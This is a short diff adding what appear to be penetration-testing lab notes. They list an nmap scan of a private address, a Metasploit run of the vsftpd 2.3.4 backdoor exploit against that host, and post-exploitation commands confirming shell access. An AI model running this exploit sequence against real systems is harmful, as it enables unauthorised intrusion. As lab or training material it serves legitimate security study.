@@ -1,0 +1,16 @@
+# Nmap Full Scan
+nmap -sV -sC -oN nmap_full_scan.txt 192.168.75.131
+
+# Metasploit Exploitation
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.75.131
+run
+
+# Proof Commands
+whoami
+id
+uname -a
+ifconfig
+netstat -tulnp
+pwd
